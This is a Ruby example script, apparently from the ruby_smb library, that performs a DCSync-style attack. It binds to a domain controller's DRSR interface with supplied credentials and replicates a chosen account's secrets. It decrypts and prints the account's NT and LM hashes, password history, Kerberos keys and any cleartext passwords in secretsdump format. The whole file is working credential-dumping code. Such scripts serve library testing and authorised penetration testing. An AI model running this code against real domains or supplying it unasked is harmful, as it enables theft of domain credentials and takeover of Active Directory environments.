#!/usr/bin/ruby

# This example script is used for testing DCERPC client and DRSR structures.
# It will attempt to connect to a host and enumerate user secrets.
# Example usage: ruby dump_secrets_from_sid.rb 192.168.172.138 msfadmin msfadmin MYDOMAIN S-1-5-21-419547006-9448028-4223375872-500
# This will try to connect to \\192.168.172.138 with the msfadmin:msfadmin
# credentials and enumerate secrets of domain user with SID
# S-1-5-21-419547006-9448028-4223375872-500

require 'bundler/setup'
require 'ruby_smb/dcerpc/client'


address      = ARGV[0]
username     = ARGV[1]
password     = ARGV[2]
domain       = ARGV[3]
sid          = ARGV[4]

client = RubySMB::Dcerpc::Client.new(
  address,
  RubySMB::Dcerpc::Drsr,
  username: username,
  password: password,
)
client.connect
puts('Binding to DRSR...')
client.bind(
  endpoint: RubySMB::Dcerpc::Drsr,
  auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
)
puts('Bound to DRSR')
ph_drs = client.drs_bind
puts "ph_drs: #{ph_drs}"
puts

dc_infos = client.drs_domain_controller_info(ph_drs, domain)
dc_infos.each do |dc_info|
  dc_info.field_names.each do |field|
    puts "#{field}: #{dc_info.send(field).to_s.encode('utf-8')}"
  end
  puts
  puts

  crack_names = client.drs_crack_names(ph_drs, rp_names: [sid])
  puts "SID: #{sid}"
  crack_names.each do |crack_name|
    puts "Domain: #{crack_name.p_domain.to_s.encode('utf-8')}"
    puts "Name: #{crack_name.p_name.to_s.encode('utf-8')}"

    user_record = client.drs_get_nc_changes(
      ph_drs,
      nc_guid: crack_name.p_name.to_s.encode('utf-8'),
      dsa_object_guid: dc_info.ntds_dsa_object_guid,
    )

    # self.__decryptHash
    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')
    puts "Decrypting hash for user: #{dn}"

    entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
    object_sid = rid = entinf_struct.p_name.sid[-4..-1].unpack('<L').first
    lm_hash = Net::NTLM.lm_hash('')
    nt_hash = Net::NTLM.ntlm_hash('')
    disabled = nil
    computer_account = nil
    password_never_expires = nil
    password_not_required = nil
    pwd_last_set = nil
    last_logon = nil
    expires = nil
    lm_history = []
    nt_history = []
    domain_name = ''
    user = 'unknown'
    kerberos_keys = {}
    clear_text_passwords = []

    entinf_struct.attr_block.p_attr.each do |attr|
      next unless attr.attr_val.val_count > 0
      # begin
      att_id = user_record.pmsg_out.msg_getchg.oid_from_attid(attr.attr_typ)
      lookup_table = RubySMB::Dcerpc::Drsr::ATTRTYP_TO_ATTID
      # rescue XXXX
      #   att_id = attr.attr_typ
      #   lookup_table = NAME_TO_ATTRTYP
      # end

      #puts "#{lookup_table.key(att_id) || 'Unknown'}: #{attr.attr_val.p_aval[0].p_val}"

      attribute_value = attr.attr_val.p_aval[0].p_val.to_ary.map(&:chr).join
      case att_id
      when lookup_table['dBCSPwd']
        encrypted_lm_hash = client.decrypt_attribute_value(attribute_value)
        lm_hash = client.remove_des_layer(encrypted_lm_hash, rid)
      when lookup_table['unicodePwd']
        encrypted_nt_hash = client.decrypt_attribute_value(attribute_value)
        nt_hash = client.remove_des_layer(encrypted_nt_hash, rid)
      when lookup_table['userPrincipalName']
        domain_name = attribute_value.force_encoding('utf-16le').encode('utf-8').split('@').last
      when lookup_table['sAMAccountName']
        user = attribute_value.force_encoding('utf-16le').encode('utf-8')
      when lookup_table['objectSid']
        object_sid = attribute_value
      when lookup_table['userAccountControl']
        user_account_control =  attribute_value.unpack('L<')[0]
        disabled = user_account_control & RubySMB::Dcerpc::Samr::UF_ACCOUNTDISABLE != 0
        computer_account = user_account_control & RubySMB::Dcerpc::Samr::UF_NORMAL_ACCOUNT == 0
        password_never_expires = user_account_control & RubySMB::Dcerpc::Samr::UF_DONT_EXPIRE_PASSWD != 0
        password_not_required = user_account_control & RubySMB::Dcerpc::Samr::UF_PASSWD_NOTREQD != 0
      when lookup_table['pwdLastSet']
        pwd_last_set = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0
          pwd_last_set = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['accountExpires']
        expires = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0 && time_value != 0x7FFFFFFFFFFFFFFF
          expires = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['lastLogonTimestamp']
        last_logon = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0
          last_logon = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['lmPwdHistory']
        tmp_lm_history = client.decrypt_attribute_value(attribute_value)
        tmp_lm_history.bytes.each_slice(16) do |block|
          lm_history << client.remove_des_layer(block.map(&:chr).join, rid)
        end
      when lookup_table['ntPwdHistory']
        tmp_nt_history = client.decrypt_attribute_value(attribute_value)
        tmp_nt_history.bytes.each_slice(16) do |block|
          nt_history << client.remove_des_layer(block.map(&:chr).join, rid)
        end
      when lookup_table['supplementalCredentials']
        # self.__decryptSupplementalInfo
        plain_text = client.decrypt_attribute_value(attribute_value)
        user_properties = RubySMB::Dcerpc::Samr::UserProperties.read(plain_text)
        user_properties.user_properties.each do |user_property|
          case user_property.property_name.encode('utf-8')
          when 'Primary:Kerberos-Newer-Keys'
            value = user_property.property_value
            binary_value = value.chars.each_slice(2).map {|a,b| (a+b).hex.chr}.join
            kerb_stored_credential_new = RubySMB::Dcerpc::Samr::KerbStoredCredentialNew.read(binary_value)
            key_values = kerb_stored_credential_new.get_key_values
            kerb_stored_credential_new.credentials.each_with_index do |credential, i|
              kerberos_type = RubySMB::Dcerpc::Samr::KERBEROS_TYPE[credential.key_type]
              if kerberos_type
                kerberos_keys[kerberos_type] = key_values[i].unpack('H*')[0]
              else
                kerberos_keys["0x#{credential.key_type.to_i.to_s(16)}"] = key_values[i].unpack('H*')[0]
              end
            end
          when 'Primary:CLEARTEXT'
            # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
            # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
            begin
              clear_text_passwords << user_property.property_value.to_s.force_encoding('utf-16le').encode('utf-8')
            rescue EncodingError
              # This could be because we're decoding a machine password. Printing it hex
              # Keep clear_text_passwords with a ASCII-8BIT encoding
              clear_text_passwords << user_property.property_value.to_s
            end
          end
        end
      end
    end

    user = "#{domain_name}\\#{user}" unless domain_name.empty?

    puts "#{user}:#{rid}:#{lm_hash.unpack('H*')[0]}:#{nt_hash.unpack('H*')[0]}:::"
    puts "Object SID: 0x#{object_sid.unpack('H*')[0]}"
    puts "Password last set: #{pwd_last_set && pwd_last_set > Time.at(0) ? pwd_last_set : 'never'}"
    puts "Last logon: #{last_logon && last_logon > Time.at(0) ? last_logon : 'never'}"
    puts "Account disabled: #{disabled.nil? ? 'N/A' : disabled}"
    puts "Computer account: #{computer_account.nil? ? 'N/A' : computer_account}"
    puts "Password never expires: #{password_never_expires.nil? ?  'N/A' : password_never_expires}"
    puts "Password not required: #{password_not_required.nil? ? 'N/A' : password_not_required}"
    puts "Expired: #{!disabled && expires && expires > Time.at(0) && expires < Time.now}"
    if nt_history.size > 1 and lm_history.size > 1
      puts "Password history:"
      nt_history[1..-1].zip(lm_history[1..-1]).each_with_index do |history, i|
        nt_h, lm_h = history
        empty_lm_h = Net::NTLM.lm_hash('')
        puts "  #{user}_history#{i}:#{rid}:#{empty_lm_h.unpack('H*')[0]}:#{nt_h.to_s.unpack('H*')[0]}::: (if LMHashes are not stored)"
        puts "  #{user}_history#{i}:#{rid}:#{lm_h.to_s.unpack('H*')[0]}:#{nt_h.to_s.unpack('H*')[0]}::: (if LMHashes are stored)"
      end
    end
    puts "Kerberos keys:"
    kerberos_keys.each do |key_type, key_value|
      puts "  #{user}:#{key_type}:#{key_value}"
    end
    puts "Clear passwords:"
    clear_text_passwords.each do |passwd|
      puts "  #{user}:CLEARTEXT:#{passwd}"
    end
  end
end

client.drs_unbind(ph_drs)
client.close

puts 'Done'
